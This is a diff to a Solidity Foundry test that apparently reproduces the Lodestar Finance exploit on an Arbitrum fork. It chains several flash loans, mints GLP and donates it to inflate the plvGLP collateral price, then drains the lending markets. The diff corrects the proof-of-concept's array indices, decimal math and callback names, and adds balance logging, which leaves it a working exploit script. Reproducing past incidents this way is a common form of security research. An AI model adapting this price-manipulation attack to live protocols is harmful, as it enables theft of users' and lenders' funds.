@@ -6,6 +6,7 @@ import "./interface.sol";
 
 // @Analysis
 // https://twitter.com/SolidityFinance/status/1601684150456438784
+// https://blog.lodestarfinance.io/post-mortem-summary-13f5fe0bb336
 // @TX
 // https://arbiscan.io/tx/0xc523c6307b025ebd9aef155ba792d1ba18d5d83f97c7a846f267d3d9a3004e8c
 
@@ -24,8 +25,8 @@ interface GMXRouter{
 }
 
 interface GMXReward{
-    function mintAndStakeGlpETH(uint256 _minUsdg, uint256 _minGlp) external payable; 
-    function mintAndStakeGlp(address _token, uint256 _amount, uint256 _minUsdg, uint256 _minGlp) external;
+    function mintAndStakeGlpETH(uint256 _minUsdg, uint256 _minGlp) external payable returns(uint256); 
+    function mintAndStakeGlp(address _token, uint256 _amount, uint256 _minUsdg, uint256 _minGlp) external returns(uint256);
 }
 
 interface SwapFlashLoan{
@@ -39,9 +40,10 @@ interface SwapFlashLoan{
 
 interface GlpDepositor{
     function donate(uint256 _amount) external;
+    function redeem(uint256 amount) external;
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is Test{
     IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
     IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);
     IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
@@ -70,27 +72,66 @@ contract ContractTest is DSTest{
     ICErc20Delegate IWBTC = ICErc20Delegate(0xD2835B08795adfEfa0c2009B294ae84B08C6a67e);
     SwapFlashLoan swapFlashLoan = SwapFlashLoan(0x401AFbc31ad2A3Bc0eD8960d63eFcDEA749b4849);
     GlpDepositor depositor = GlpDepositor(0x13F0D29b5B83654A200E4540066713d50547606E);
+    address GlpManager = 0x321F653eED006AD1C29D174e17d96351BDe22649;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
         cheats.createSelectFork("arbitrum", 45121903);
+        cheats.label(address(USDC), "USDC");
+        cheats.label(address(DAI), "DAI");
+        cheats.label(address(WETH), "WETH");
+        cheats.label(address(USDT), "USDT");
+        cheats.label(address(FRAX), "FRAX");
+        cheats.label(address(sGLP), "sGLP");
+        cheats.label(address(MIM), "MIM");
+        cheats.label(address(WBTC), "WBTC");
+        cheats.label(address(PlvGlpToken), "PlvGlpToken");
+        cheats.label(address(AaveFlash), "AaveFlash");
+        cheats.label(address(Radiant), "Radiant");
+        cheats.label(address(UniV3Flash1), "UniV3Flash1");
+        cheats.label(address(UniV3Flash2), "UniV3Flash2");
+        cheats.label(address(UniV3Flash3), "UniV3Flash3");
+        cheats.label(address(Pair), "Pair");
+        cheats.label(address(Router), "Router");
+        cheats.label(address(Reward), "Reward");
+        cheats.label(address(unitroller), "unitroller");
+        cheats.label(address(IUSDC), "IUSDC");
+        cheats.label(address(lplvGLP), "lplvGLP");
+        cheats.label(address(IETH), "IETH");
+        cheats.label(address(IMIM), "IMIM");
+        cheats.label(address(IUSDT), "IUSDT");
+        cheats.label(address(IFRAX), "IFRAX");
+        cheats.label(address(IDAI), "IDAI");
+        cheats.label(address(IWBTC), "IWBTC");
+        cheats.label(address(swapFlashLoan), "swapFlashLoan");
+        cheats.label(address(depositor), "depositor");
+        cheats.label(GlpManager, "GlpManager");
     }
 
     function testExploit() external{
         address[] memory assets = new address[](3);
         assets[0] = address(USDC);
         assets[1] = address(WETH);
-        assets[0] = address(DAI);
+        assets[2] = address(DAI);
         uint256[] memory amounts = new uint256[](3);
         amounts[0] = 17_290_000 * 1e6;
         amounts[1] = 9_500 * 1e18;
-        amounts[2] = 4_063_156 * 1e18;
+        amounts[2] = 406_316 * 1e18;
         uint256[] memory modes = new uint[](3);
         modes[0] = 0;
         modes[1] = 0;
         modes[2] = 0;
-        AaveFlash.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(1), 0);
+        AaveFlash.flashLoan(address(this), assets, amounts, modes, address(0), "", 0);
+
+        emit log_named_decimal_uint("Attacker PlvGlpToken balance after exploit", PlvGlpToken.balanceOf(address(this)), PlvGlpToken.decimals());
+        console.log("Attacker swap all PlvGlpToken to about 4500 ETH");
+        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
+        emit log_named_decimal_uint("Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals());
+        emit log_named_decimal_uint("Attacker MIM balance after exploit", MIM.balanceOf(address(this)), MIM.decimals());
+        emit log_named_decimal_uint("Attacker FRAX balance after exploit", FRAX.balanceOf(address(this)), FRAX.decimals());
+        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
+        emit log_named_decimal_uint("Attacker WBTC balance after exploit", WBTC.balanceOf(address(this)), WBTC.decimals());
     }
 
     function executeOperation(
@@ -107,7 +148,7 @@ contract ContractTest is DSTest{
             address[] memory assets = new address[](1);
             assets[0] = address(USDC);
             uint256[] memory amounts = new uint256[](1);
-            amounts[0] = 14_435_000 * USDC.decimals();
+            amounts[0] = 14_435_000 * 1e6;
             uint256[] memory modes = new uint[](1);
             modes[0] = 0;
             Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(1), 0);
@@ -115,31 +156,30 @@ contract ContractTest is DSTest{
         }
         else if(msg.sender == address(Radiant)){
             USDC.approve(address(Radiant), type(uint).max);
-            UniV3Flash1.flash(address(this), 5_460 * WETH.decimals(), 7_170_000 * USDC.decimals(), new bytes(1));
+            UniV3Flash1.flash(address(this), 5_460 * 1e18, 7_170_000 * 1e6, new bytes(1));
             return true;
         }
-
     }
 
-    function uniswapV3Callback(uint256 amount0, uint256 amount1, bytes calldata data) external{
+    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external{
         if(msg.sender == address(UniV3Flash1)){
-            UniV3Flash2.flash(address(this), 0, 2_200_000 * USDC.decimals(), new bytes(1));
-            USDC.transfer(address(UniV3Flash1), 7_173_631 * USDC.decimals());
+            UniV3Flash2.flash(address(this), 0, 2_200_000 * 1e6, new bytes(1));
+            USDC.transfer(address(UniV3Flash1), 7_173_631 * 1e6);
             USDC.approve(address(Router), 19_012_632 * 1e6);
             address[] memory path = new address[](2);
             path[0] = address(USDC);
             path[1] = address(WETH);
             Router.swap(path, 19_012_632 * 1e6, 8000 * 1e18, address(this));
-            WETH.transfer(address(UniV3Flash1), 5_463 * WETH.decimals());
+            WETH.transfer(address(UniV3Flash1), 5_463 * 1e18);
         }
         else if(msg.sender == address(UniV3Flash2)){
-            Pair.swap(0, 10_000_000 * USDC.decimals(), address(this), new bytes(1));
-            USDC.transfer(address(UniV3Flash2), 2_201_111 * USDC.decimals());
+            Pair.swap(0, 10_000_000 * 1e6, address(this), new bytes(1));
+            USDC.transfer(address(UniV3Flash2), 2_201_111 * 1e6);
         }
         else if(msg.sender == address(UniV3Flash3)){
-            swapFlashLoan.flashLoan(address(this), address(FRAX), 361_037 * FRAX.decimals(), new bytes(1));
-            USDT.transfer(address(UniV3Flash3), 397_256 * USDT.decimals());
-            USDC.transfer(address(UniV3Flash3), 1_610_460 * USDC.decimals());
+            swapFlashLoan.flashLoan(address(this), address(FRAX), 361_037 * 1e18, new bytes(1));
+            USDT.transfer(address(UniV3Flash3), 397_256 * 1e6);
+            USDC.transfer(address(UniV3Flash3), 1_610_460 * 1e6);
         }
     }
 
@@ -148,8 +188,8 @@ contract ContractTest is DSTest{
         address[] memory path = new address[](2);
         path[0] = address(WETH);
         path[1] = address(USDC);
-        Router.swapETHToTokens{value: 14960 ether}(path, 18_890_000 * USDC.decimals(), address(this)); // 14,960 WETH for 19,001,512 USDC
-        USDC.approve(address(IUSDC), type(uint).max);
+        Router.swapETHToTokens{value: 14960 ether}(path, 18_890_000 * 1e6, address(this)); // 14,960 WETH for 19,001,512 USDC
+        USDC.approve(address(IUSDC), USDC.balanceOf(address(this)));
         IUSDC.mint(USDC.balanceOf(address(this))); // 70M USDC
         address[] memory cTokens = new address[](1);
         cTokens[0] = address(IUSDC);
@@ -161,8 +201,12 @@ contract ContractTest is DSTest{
             lplvGLP.mint(PlvGlpTokenAmount);
         }
         lplvGLP.borrow(PlvGlpTokenAmount);
-        UniV3Flash3.flash(address(this), 397_054 * USDT.decimals(), 1_609_646 * USDC.decimals(), new bytes(1));
-        USDC.transfer(address(Pair), 10_030_500 * USDC.decimals());
+        deal(address(lplvGLP), address(0), 3_051_070_161 * 1e8); // the exploiter' balance
+        cheats.startPrank(address(0));
+        lplvGLP.transfer(address(this), lplvGLP.balanceOf(address(this)));
+        cheats.stopPrank();
+        UniV3Flash3.flash(address(this), 397_054 * 1e6, 1_609_646 * 1e6, new bytes(1));
+        USDC.transfer(address(Pair), 10_030_500 * 1e6);
     }
 
     function executeOperation(
@@ -172,18 +216,19 @@ contract ContractTest is DSTest{
         uint256 fee,
         bytes calldata params
     ) external payable{
-        Reward.mintAndStakeGlpETH{value: 1580 ether}(1_836_000 * 1e18, 2_156_500 * 1e18);
-        FRAX.approve(address(Reward), FRAX.balanceOf(address(this)));
-        Reward.mintAndStakeGlp(address(FRAX), FRAX.balanceOf(address(this)), 300_000 * 1e18, 361_000 * 1e18);
-        USDC.approve(address(Reward), USDC.balanceOf(address(this)));
-        Reward.mintAndStakeGlp(address(USDC), USDC.balanceOf(address(this)), 1_500_000 * 1e18, 1_757_500 * 1e18);
-        DAI.approve(address(Reward), DAI.balanceOf(address(this)));
-        Reward.mintAndStakeGlp(address(DAI), DAI.balanceOf(address(this)), 390_000 * 1e18, 399_000 * 1e18);
-        USDT.approve(address(Reward), USDT.balanceOf(address(this)));
-        Reward.mintAndStakeGlp(address(USDT), USDT.balanceOf(address(this)), 350_000 * 1e18, 427_500 * 1e18);
-        sGLP.approve(address(depositor), sGLP.balanceOf(address(this)));
+        uint ETHglpAmount = Reward.mintAndStakeGlpETH{value: 1580 ether}(1_836_000 * 1e18, 2_156_500 * 1e18);
+        FRAX.approve(GlpManager, FRAX.balanceOf(address(this)));
+        uint FRAXglpAmount = Reward.mintAndStakeGlp(address(FRAX), FRAX.balanceOf(address(this)), 300_000 * 1e18, 361_000 * 1e18);
+        USDC.approve(GlpManager, USDC.balanceOf(address(this)));
+        uint USDCglpAmount = Reward.mintAndStakeGlp(address(USDC), USDC.balanceOf(address(this)), 1_500_000 * 1e18, 1_757_500 * 1e18);
+        DAI.approve(GlpManager, DAI.balanceOf(address(this)));
+        uint DAIglpAmount = Reward.mintAndStakeGlp(address(DAI), DAI.balanceOf(address(this)), 390_000 * 1e18, 399_000 * 1e18);
+        USDT.approve(GlpManager, USDT.balanceOf(address(this)));
+        uint USDTglpAmount = Reward.mintAndStakeGlp(address(USDT), USDT.balanceOf(address(this)), 350_000 * 1e18, 427_500 * 1e18);
 
-        depositor.donate(sGLP.balanceOf(address(this)));
+        uint glpAmount = ETHglpAmount + FRAXglpAmount + USDCglpAmount + DAIglpAmount + USDTglpAmount;
+        sGLP.approve(address(depositor), glpAmount);
+        depositor.donate(glpAmount); // plvGLP price manipulation
 
         address[] memory cTokens = new address[](1);
         cTokens[0] = address(lplvGLP);
@@ -198,10 +243,9 @@ contract ContractTest is DSTest{
         IETH.borrow(address(IETH).balance);
         IMIM.borrow(MIM.balanceOf(address(IMIM)));
         IUSDT.borrow(USDT.balanceOf(address(IUSDT)));
-        IUSDC.borrow(USDC.balanceOf(address(IUSDC)));
         IFRAX.borrow(FRAX.balanceOf(address(IFRAX)));
         IDAI.borrow(DAI.balanceOf(address(IDAI)));
-        IWBTC.borrow(IWBTC.balanceOf(address(WBTC)));
+        IWBTC.borrow(WBTC.balanceOf(address(IWBTC)));
     }
 
     receive() payable external{}
